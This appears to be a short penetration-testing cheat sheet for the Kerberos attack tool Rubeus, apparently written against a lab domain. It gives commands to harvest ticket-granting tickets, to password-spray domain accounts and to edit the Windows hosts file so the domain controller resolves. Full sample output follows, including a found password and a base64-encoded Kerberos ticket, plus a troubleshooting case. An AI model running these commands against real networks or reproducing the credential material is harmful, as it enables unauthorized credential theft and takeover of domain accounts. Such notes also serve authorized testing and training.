# rubeus
## Examples
### Harvest Ticket-Granting-Tickets for 30 seconds
```
Rubeus.exe harvest /interval:30
```
### Brute Forcing or Password Spraying
1.  First ensure that the add the domain controller domain name to windows host file
```
echo $IP $DC_NAME >> C:\Windows\System32\drivers\etc\hosts
```
1.  Execute the following where Rubeus is located
```
Rubeus.exe brute /password:$PASSWORD /noticket
```
#### Successful output
```
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe brute /password:Password1 /notic
ket

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[-] Blocked/Disabled user => Guest 
[-] Blocked/Disabled user => krbtgt 
[+] STUPENDOUS => Machine1:Password1
[*] base64(Machine1.kirbi): 
 
      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi
      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKiggPx
      BIID7WwK2hpJEqzXkk5gJEasT7fEVH9N0Ha4THBUUdV4WZ5y9b8hx889jAEA5GThZ1QfvfhG/HHigL3H
      wXIVDMIC+oC2mh5qvc2fodIImEGZ8KoZRX+PXFU4Yu+LRWL6gcI2B7ZFwvCRmk9bO6Ev1eD8ohndjx5z
      6bJnsyp0xbDyk1dJahuqR+RxE8Q4vLF9Rm+ECrUQNAsFULmdi+TPO7GKUZ6GxIwCWp28X7GAeNhcLj5O
      8PiA+8JKceyvwvnk5iNZp1zrXTiL23NwYW2lJ+fRPCmG6oFP03F79sCNQ9t3m83m8jH9T9R7uYADCY0X
      6HVrA2pUl9NAF3jUXVzil60Mj52KmIVaYWxjotVCQopyeMtOAjrYzFvl6n8LxWX1sB0ySzABhObjM92J
      sxz2DY7uD46CNwdEe+l6G4ogCP/RRZFKG9+fn++sz8I05u/AHtm3d6ximAiIy7lFGEU3H/J2MZGRSMMt
      6IELTWEB4Cq6hQzt7OBNHkNP/q+fHcWxf35Cgl7utecN5cnT79GyZ8kyEg1SDJOwSYtXd74LaAFwRU5W
      4xWZl3fmxwnIffuv1m2TgSjQzSkBYpK6CHtuDCi0AiieCzKf3A9iXO9jMzb6XsoltVm0UddjfWGfGhkh
      0ZyVhJq36zAgcfN9h20upyrWmgmjO0JtiXKfCkyup8+QUgFY9AmISsgqYWQRhlmSe38xKgtWHMOPxYmr
      IN7497N1GaXklt14oxNb/qgtnAksZ/I5m8JM0R5n6usWze/dusy7YqsvgqkxCdnH2mfvxKBuXVtdNuhS
      PfHyr9sSWCebSTfHF0diHwzgnVk/zzfdCUMHiWgxt1/bZiKB/1OhVVuoOf9qCW5GfpuR1IYDuPSqgIy6
      zBc67LSzXJRyHjIElEr2yEzyjCs3siE7CZGQJLoCWZXDd25dSNewSrUls9h4xcxfWXrEv9c9zd0tmkxb
      UhsYf3uu9MShtBcmE3XsgiEpWLPxIoXef2YkaSYCOwWFsLYu1r/o7ZhssEAruuhd2h8NVkaXlBQQsrvc
      sjj8k8uSEjdI2TfrhDnbyhmA4qsJS/Q9JH8B32ca75NpOb1YHVO++r6HKUhy7qujEI2IpQv6i9+qhEU3
      9GcUPea90QpXeoWtphU0Jj1B0pPRLgWxf3/yzvNKPdyWHF/N28lQsYlLa+kxaFTCX9sQdzaDB1VhZf8d
      ca3ZmeX5kTo/bhhDlRs3ucU73g0AvEHm870U2QLTjuubE+LYIm7kTlYiSdSREsntB/n3fIv5A/dHhY7U
      cdtUH/aD6SeEOMATvIVpiA+tEWFAR7+fK1/PM+OoMTV4OO4tiqHo8dtFx8RT6EyayKOB8jCB76ADAgEA
      ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIOoM3i3j3HyrePF/hTinxdPLWDAVUpdEvwMM
      4yMEPRC9oRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR
      GA8yMDIyMDIyNjE2MTA1NFqmERgPMjAyMjAyMjcwMjEwNTRapxEYDzIwMjIwMzA1MTYxMDU0WqgSGxBD
      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs



[+] Done


controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>
```
#### Bad output
##### Unknown Domain Controller
The following is caused by the windows hosts file not having the IP and name of the domain controller when brute forcing passwords
```
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe brute /password:Password1 /notic
ket

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/
 
  v1.5.0
 
[X] Error resolving hostname 'CONTROLLER.local' to an IP address: No such host is known
 
[X] Unable to get domain controller address


controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>
```
